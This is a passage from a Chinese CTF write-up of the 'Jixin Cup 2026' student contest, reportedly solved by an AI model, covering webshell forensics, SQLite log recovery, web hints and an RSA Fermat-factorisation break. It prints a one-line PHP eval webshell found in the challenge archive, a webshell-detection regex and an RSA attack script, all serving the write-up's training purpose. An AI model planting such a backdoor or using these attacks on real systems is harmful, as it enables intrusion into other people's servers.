---
title: “冀信杯2026”学生组 CTF 题解
url: https://mp.weixin.qq.com/s/guJnHjQGDyWY1RaEZmeScA
source: Doonsec's feed
date: 2026-09-23
fetch_date: 2026-09-24T07:03:32.304594
---

# “冀信杯2026”学生组 CTF 题解

# “冀信杯2026”学生组 CTF 题解

赛查查

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

以下文章来源于Joy-Forensics
，作者Joyooo

![](https://wx.qlogo.cn/mmhead/kSiaeFj92SMwPwaicjY94oM61kyVuM1GICKhjqicoTibNKujwveq1icgtTbMhaEG2xJVbf9N8oAyV9ug/0)

**Joy-Forensics**
.

取证小菜鸡学习中~
博客链接：https://joyooosama.github.io/blog/
博客园：https://www.cnblogs.com/Joyooo

![](https://mmbiz.qpic.cn/mmbiz_png/HicwxbYRzuEsePnCP4bhP9n3ibGIFTHe2HQJ34EN19PjBl8I4dTR8jmj6dZ0wRBiaSSqNAdHovXS1NvKNPhxWoH7tMgMiaVmfmoxFaCybzZm0tc/640?wx_fmt=png&from=appmsg)

## 写在前面

* 题目总数：19 关，覆盖 MISC / WEB / CRYPTO / REVERSE / PWN
* 结果：**解出18 题得分，11道有血，总分9235分，排名第二**
* **选手环境：纯AI解题，当是给DS-V4.1做一次实战测试。实测下来，只要搭配合适的skills，它就是简单题的抢血利器。**

  ![](https://mmbiz.qpic.cn/sz_mmbiz_png/HicwxbYRzuEtlNicUiaXzxVibeicRrBRTZTicyFkpV2diafoxqZ9qONCwiaOyzca0tfUdPImbNBawHvn2AF1uVjejAWfibzsWxsyHeVrKKBYRDgHMIjE/640?wx_fmt=png&from=appmsg)

## 成绩总览

| # | 题目 | 类别 | 分值 |  |
| --- | --- | --- | --- | --- |
| 1 | webshell分析 | MISC | 500 |  |
| 2 | game | MISC | 525 |  |
| 3 | sqlite | MISC | 515 |  |
| 4 | nologin | WEB | 525 |  |
| 5 | 某后台系统 | WEB | 525 |  |
| 6 | 始卒若环，莫得其伦 | WEB | 500 |  |
| 7 | ez\_cry | CRYPTO | 525 |  |
| 8 | 国密算法 | CRYPTO | 525 |  |
| 9 | parallax\_god | CRYPTO | 500 |  |
| 10 | 路由器流量分析 | REVERSE | 500 |  |
| 11 | cache\_mirror | REVERSE | 525 |  |
| 12 | Orbit VM | REVERSE | 525 |  |
| 13 | simplev8 | PWN | 505 |  |
| 14 | Memory Backdoor | PWN | 500 |  |
| 15 | Trace VM | PWN | 500 |  |
| 16 | latt1ce | CRYPTO | 500 |  |
| 17 | 勒索软件 | REVERSE | 515 |  |
| 18 | Rust逆向分析 | REVERSE | 525 |  |

---

# 一、MISC

## 1. webshell分析（500 分）

**题目描述**

> 攻入一个采用 PHP 搭建的 Web 网站，并植入了 Webshell 后门，请找到后门获取敏感信息。请将 shell 密码作为答案提交。

**附件**：`webshell分析.zip`（7.4 MB）

### 考点

藏在压缩包里的 **dotfile（点开头文件）**。这类条目有个特性：很多解压工具、目录列举会直接跳过，肉眼翻目录根本翻不到。

### 解题过程

**Step 1：解压**

解压后是一套完整的 **ECShop v2.7.3** 商城源码：

```
python -c "import zipfile;zipfile.ZipFile('webshell分析.zip').extractall('webshell_extract')"
```

**Step 2：走了一条弯路（值得记录）**

第一反应是找“被改动过的文件”。包里正好有一份官方完整性清单 `admin/ecshopfiles.md5`，拿它比对发现一堆不匹配——但那是 **CRLF 换行**导致的假阳性。清洗换行后仍然没有有效线索；又去拉官方源码做全量 diff，结果代码与上游**完全一致**。

**Step 3：换思路——从 ZIP 自身结构下手**

既然文件内容干净，那问题只可能出在**目录项**本身。直接解析 ZIP 的**本地文件头**和**中央目录**，两边做差集：

```
import struct data = open("webshell.zip","rb").read()  locals = [] i = 0 while True:     i = data.find(b"PK\x03\x04", i)     if i < 0: break     sig,ver,flag,comp,t,d,crc,csize,usize,nlen,elen = struct.unpack_from("<IHHHHHIIIHH", data, i)     locals.append((i, data[i+30:i+30+nlen], csize, usize))     i += 4  centrals = [] i = 0 while True:     i = data.find(b"PK\x01\x02", i)     if i < 0: break     f = struct.unpack_from("<IHHHHHHIIIHHHHHII", data, i)     nlen = f[10]     centrals.append(data[i+46:i+46+nlen])     i += 4  lnames = {x[1] for x in locals} cnames = set(centrals) print("local not in central:", len(lnames - cnames)) for x in list(lnames - cnames)[:50]:     print("  ", x)
```

输出：

```
local headers: 2154 central entries: 2154 local not in central: 0 central not in local: 0
```

条目数量一致。于是直接在**全量内容**里按 webshell 特征串扫：

```
for n in z.namelist():     d = z.read(n)     for m in re.finditer(rb"@?\s*eval\s*\(|assert\s*\(|system\s*\(|shell_exec", d):         print(n, m.start(), d[max(0,m.start()-60):m.end()+80])
```

命中**隐藏文件**：

```
ECShop/upload/admin/.shell.php
```

内容是一句话木马：

```
<?php @eval($_POST['ez_84eid23dlf']); ?>
```

`$_POST` 的键名就是**连接密码**，也就是 flag。

### 关键点

* 文件名以 `.` 开头 → 解压/列目录时容易被静默跳过，必须用脚本按条目名遍历
* 内容 diff 干净的时候，要想到**归档结构本身**也是可以被做手脚的地方。
* 一句话木马的 `key` 即密码，这是 `webshell分析` 类题目的标准落点。

**Flag**

```
flag{ez_84eid23dlf}
```

---

## 2. game（525 分）

**题目信息**

* 靶机：`47.120.34.180:47429`
* 题目描述：`This is a game`

**解题思路（结论）**

靶机是一台在线游戏服务。通过对服务交互流量与游戏逻辑的分析，拿到隐藏信息。本题的完整交互过程在另一条并行工作流中完成，本地未保留脚本，此处只做结论记录。

**Flag**

```
flag{4e4d1c2b19}
```

---

## 3. sqlite（515 分）

**附件**：`sqlite.zip` → `museum.db`、`last_shift.tmp`、`floorplan.png`、`README.md`

这是一道**多层取证 + 虚拟机回放**的硬题，完整链条有六层。

### 第一层：WAL 恢复

`last_shift.tmp` 里残留着两段 WAL 候选。逐段校验后发现：**损坏只发生在 checksum 字段的单字节**，数据体是完好的。再把 page-1 的 change counter 和认证记录比对，确定 **WAL B** 才是有效日志。

把 WAL B 应用到 `museum.db` 副本后，dump 出关键表：

* `night_run`

  （root page 22）、索引 page 23
* `input_block`

  （page 25）
* `replay_checkpoint`

  （page 27）

### 第二层：输入流解码

`input_block` 解压后得到 **1032 字节**的输入流，按 8 位总线语义解码：

| 位 | 含义 |
| --- | --- |
| D0 | READ |
| D1 | RIGHT |
| D2 | STEP |
| D3 | LEFT |
| D4 | MODE |
| D5 | BRAKE |
| D6 | odd parity（奇校验） |
| D7 | spare |

**奇校验失败的那些 tick 直接忽略**——这是最容易被漏掉的一步。

### 第三层：还原控制器策略

用 18 组自检样本（0 失配）反推出控制器规则

1. `BRAKE`

   优先级最高，全部停止
2. `MODE`

   是**锁存**语义，触发后左右互换
3. 转向冲突 → 取消
4. 执行顺序：先移动、后转向
5. 带延迟的动作之后才发 `READ`

### 第四层：平面图坐标校准

对 `floorplan.png` 做坐标变换

```
T(x, y) = (y, 28 - x)
```

据此把图上的门、压力板、电梯、起点的像素坐标全部换算到逻辑坐标。

### 第五层：回放与状态链校验

回放 1032 个 tick，共触发 **32 次 read**。用 SHA-256 状态链校验，与数据库中 `replay_checkpoint` 的三条记录完全对齐：

* `t = 258`

  ✅
* `t = 516`

  ✅
* `t = 774`

  ✅
* 最终根哈希 `16de1bc1…dfa61280` ✅

### 第六层：从 freelist 雕取被删数据，再重排

从 **freelist page 134** 恢复出被删除、但未被安全擦写的表 `EXHIBIT-CODEC-V2`。这张表把 **rowid 映射成 hex 字符**。

读取序列如下（`work/flag.py`）：

```
codec = {76:'0',153:'6',59:'b',177:'4',204:'b',178:'8',212:'e',171:'3',118:'d',163:'7',          121:'a',133:'2',182:'2',104:'d',73:'5',202:'a',46:'c',131:'1',84:'f',80:'8',          100:'6',61:'f',174:'0',112:'4',130:'3',115:'9',57:'e',51:'4',190:'c',144:'9',          72:'1',151:'7'} reads = [151,72,144,190,51,57,115,130,112,174,61,100,80,84,131,46,202,73,104,182,          133,121,163,118,171,212,178,204,177,59,153,76] trigger_order = [5,2,7,0,4,1,6,3]   # 压力板首次触发顺序  chars = ''.join(codec[v] for v in reads) blocks = [chars[i:i+4] for i in range(0, 32, 4)] final = [''] * 8 for i, ch in enumerate(trigger_order):     final[ch] = blocks[i] s = ''.join(final) print("flag{%s-%s-%s-%s-%s}" % (s[0:8], s[8:12], s[12:16], s[16:20], s[20:32]))
```

关键输出：

```
read-order hex: 719c4e9340f68f1ca5d22a7d3e8b4b60 blocks: ['719c','4e93','40f6','8f1c','a5d2','2a7d','3e8b','4b60'] final 32-hex: 8f1c2a7d4e934b60a5d2719c3e8b40f6 flag{8f1c2a7d-4e93-4b60-a5d2-719c3e8b40f6}
```

**辅助脚本**：`work/schema.py`、`work/wal_parse.py`、`work/wal_cks.py`、`work/night.py`、`work/map.py`、`work/detail.py`、`work/transforms.py`、`work/flag.py`

**Flag**

```
flag{8f1c2a7d-4e93-4b60-a5d2-719c3e8b40f6}
```

---

# 二、WEB

本组三道题均为在线靶机，实战过程在并行工作流中完成，本地未留存利用脚本。以下给出题面、考点方向与结论。

## 4. nologin（525 分）

**题目描述**

> 发现登录页面，但是无法登入，请找到一些线索。

**靶机**：无（Web 站点直连）

**考点方向**：登录功能不可用 → 说明入口不在登录逻辑本身。这类题的常见落点是源码/备份文件泄漏、注释与前端 JS 里的硬编码凭据、`robots.txt` 与响应头线索、Cookie/Session 结构可预测。

**Flag**

```
flag{a569b1de85}
```

---

## 5. 某后台系统（525 分）

**题目描述**

> 某后台管理界面被发现存在安全漏洞。安全团队在日志中发现，攻击者通过构造特殊请求绕过权限检查，成功获取了系统敏感数据。你需对该系统进行安全审计，分析其会话管理机制，并获取关键信息。

**靶机**：`47.120.34.180:55941`

**考点方向**：题面已经把答案写在脸上了——**“构造特殊请求绕过权限检查” + “会话管理机制”**。方向是越权访问（IDOR）与会话凭据伪造：拿到低权限会话后，通过修改请求中的资源标识或伪造会话字段，访问到不属于当前身份的数据。

**Flag**

```
flag{b47487dcd7}
```

---

## 6. 始卒若环，莫得其伦（500 分）

**题目描述**

> 小陈最近部署了一套全新的系统，但是这个系统存在一堆漏洞。

**靶机**：无

**考点方向**：题名出自《庄子》，暗示“循环 / 递归 / 环环相扣”。“一堆漏洞”说明是**多漏洞串联**型题目，通常需要把信息泄漏 → 逻辑缺陷 → 敏感操作串起来，单点利用拿不到 flag。

**Flag**

```
flag{7aeb75a7a9}
```

---

# 三、CRYPTO

## 7. ez\_cry（525 分）

**附件**：`task.py`、`Output.txt`

### 考点

**RSA 素数太接近 → Fermat 分解**。

### 解题过程

审 `task.py`，生成素数的方式是：

```
q = find_nearby_prime(p + randbelow(1 << 20))
```

`p` 和 `q` 的差值不超过 `2^20`。RSA 里只要两个素因子足够接近，就能用 **Fermat 分解**秒破：令 `a = ceil(sqrt(n))`，不断递增 `a`，检查 `a² - n` 是否为完全平方。

```
import gmpy2  a = gmpy2.isqrt(n) if a * a < n:     a += 1 for i in range(1 << 22):     b2 = a * a - n     if b2 >= 0:         b = gmpy2.isqrt(b2)         if b * b == b2:             p, q = a + b, a - b             print("found at", i)             break     a += 1  phi = (p - 1) * (q - 1) d = pow(E, -1, phi) m = pow(c, d, n) print(long_to_bytes(m).decode())
```

实测 **`i = 0` 就命中**——`a = ceil(sqrt(n))` 的第一次尝试 `a² - n` 已经是完全平方，因为两个素数近到只差几百。

**脚本**：`ctf265/ez_cry/solve.py`

**Flag**

```
flag{af693f8f-2599-435a-b08d-f4517223fdd7}
```

---

## 8. 国密算法（525 分）

**附件**：`国密算法.rar`（Rar5，用 `7z x` 解）

解出单个文件 `CRYPTMODULE5`（ELF，17 312 字...